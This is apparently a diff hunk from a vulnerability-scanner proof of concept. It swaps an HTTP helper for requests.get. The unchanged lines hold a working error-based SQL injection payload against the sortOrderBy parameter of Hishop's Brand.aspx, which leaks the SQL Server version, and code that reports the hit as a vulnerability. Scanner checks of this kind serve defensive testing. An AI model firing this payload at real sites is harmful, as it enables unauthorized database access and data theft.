@@ -38,8 +38,8 @@ class Poc(ABPoc):
             payload = '/Brand.aspx?pageIndex=1&sortOrderBy=VistiCounts%20Desc)%20AS%20RowNumber%20FROM%20vw_Hishop_BrowseProductList%20p%20WHERE%20SaleStatus%20=%201)%20T%20WHERE%201=1%20and%201=\
                 convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version))%20--'
             target = arg + payload
-            code, head,res, errcode, _ = hh.http(target)
-            if code!=0 and 'GAO JI@Microsoft SQL Server' in res: 
+            req = requests.get(target)
+            if req.status_code!=0 and 'GAO JI@Microsoft SQL Server' in req.text: 
                 #security_hole(target)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
